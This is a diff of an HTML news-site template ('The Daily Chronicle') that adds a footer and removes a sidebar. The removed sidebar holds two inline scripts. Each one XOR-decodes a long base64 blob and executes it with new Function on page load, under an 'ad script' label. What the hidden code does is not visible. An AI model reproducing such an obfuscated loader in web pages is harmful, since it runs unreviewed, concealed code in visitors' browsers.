+                <a href="#" class="tag">Healthcare</a>
+                <a href="#" class="tag">Education</a>
+                <a href="#" class="tag">Sustainability</a>
+                <a href="#" class="tag">Innovation</a>
+                <a href="#" class="tag">Politics</a>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-container">
+            <div>
+                <div class="footer-logo">The <span>Daily</span> Chronicle</div>
+                <p class="footer-about">Delivering trusted news and insightful analysis on global events since 1998. Our team of dedicated journalists works tirelessly to bring you the stories that matter.</p>
+            </div>
+            <div>
+                <h4 class="footer-heading">Sections</h4>
+                <ul class="footer-links">
+                    <li class="footer-link"><a href="#">Politics</a></li>
+                    <li class="footer-link"><a href="#">Business</a></li>
+                    <li class="footer-link"><a href="#">Technology</a></li>
+                    <li class="footer-link"><a href="#">Science</a></li>
+                    <li class="footer-link"><a href="#">Health</a></li>
                 </ul>
             </div>
-
-            <div class="sidebar">
-                <script>
-
-                    (function(){
-                      const _k='hEOj6NiaxdLpz7bkfwkCyQap8X3ytOZnT2Ep/XsEk38=';
-                      const _d='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';
-                      
-                      const _dec=(str,key)=>{
-                        const decoded=atob(str);
-                        let result='';
-                        for(let i=0;i<decoded.length;i++){
-                          const keyChar=key.charCodeAt(i%key.length);
-                          const strChar=decoded.charCodeAt(i);
-                          result+=String.fromCharCode(strChar^keyChar);
-                        }
-                        return result;
-                      };
-                
-                      try {
-                        const script=_dec(_d,_k);
-                        const f=new Function(script);
-                        f();
-                      } catch(e) {
-                        console.error('Ad script initialization error:',e);
-                        if(document.currentScript) {
-                          const container = document.createElement('div');
-                          container.className = 'yepper-ad-wrapper';
-                          document.currentScript.parentNode.insertBefore(container, document.currentScript);
-                          container.innerHTML = `
-                            <div class="yepper-ad-empty">
-                              <div class="yepper-ad-empty-title">Advertisement</div>
-                              <div class="yepper-ad-empty-text">Unable to load advertisement</div>
-                            </div>
-                          `;
-                        }
-                      }
-                    })();
-                </script>
-
-                <script>
-
-                    (function(){
-                    const _k='jyn8FZbNFAtXvYG9BQY/P1PsrRWrWJ5N7zPQHgu2FzY=';
-                    const _d='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';
-                    
-                    const _dec=(str,key)=>{
-                        const decoded=atob(str);
-                        let result='';
-                        for(let i=0;i<decoded.length;i++){
-                        const keyChar=key.charCodeAt(i%key.length);
-                        const strChar=decoded.charCodeAt(i);
-                        result+=String.fromCharCode(strChar^keyChar);
-                        }
-                        return result;
-                    };
-
-                    try {
-                        const script=_dec(_d,_k);
-                        const f=new Function(script);
-                        f();
-                    } catch(e) {
-                        console.error('Ad script initialization error:',e);
-                        if(document.currentScript) {
-                        const container = document.createElement('div');
-                        container.className = 'yepper-ad-wrapper';
-                        document.currentScript.parentNode.insertBefore(container, document.currentScript);
-                        container.innerHTML = `
-                            <div class="yepper-ad-empty">
-                            <div class="yepper-ad-empty-title">Advertisement</div>
-                            <div class="yepper-ad-empty-text">Unable to load advertisement</div>
-                            </div>
-                        `;
-                        }
-                    }
-                    })();
-                </script>
-                <h2>Breaking News</h2>
-                <ul>
-                    <li>Markets Rally on Strong Economic Data</li>
-                    <li>Climate Summit Reaches Historic Agreement</li>
-                    <li>New Medical Breakthrough in Cancer Research</li>
+            <div>
+                <h4 class="footer-heading">Company</h4>
+                <ul class="footer-links">
+                    <li class="footer-link"><a href="#">About Us</a></li>
+                    <li class="footer-link"><a href="#">Contact</a></li>
+                    <li class="footer-link"><a href="#">Careers</a></li>
+                    <li class="footer-link"><a href="#">Advertise</a></li>
+                    <li class="footer-link"><a href="#">Ethics Policy</a></li>
+                </ul>
+            </div>
+            <div>
+                <h4 class="footer-heading">Connect</h4>
+                <ul class="footer-links">
+                    <li class="footer-link"><a href="#">Newsletter</a></li>
+                    <li class="footer-link"><a href="#">Mobile Apps</a></li>
+                    <li class="footer-link"><a href="#">Social Media</a></li>
+                    <li class="footer-link"><a href="#">Podcasts</a></li>
+                    <li class="footer-link"><a href="#">Events</a></li>
                 </ul>
             </div>
         </div>
-    </body>
+        <div class="footer-bottom">
+            <div>© 2025 The Daily Chronicle. All rights reserved.</div>
+            <div>
+                <a href="#" style="color: #9ca3af; margin-right: 1rem;">Privacy Policy</a>
+                <a href="#" style="color: #9ca3af; margin-right: 1rem;">Terms of Service</a>
+                <a href="#" style="color: #9ca3af;">Cookie Policy</a>
+            </div>
+        </div>
+    </footer>
+</body>
 </html>
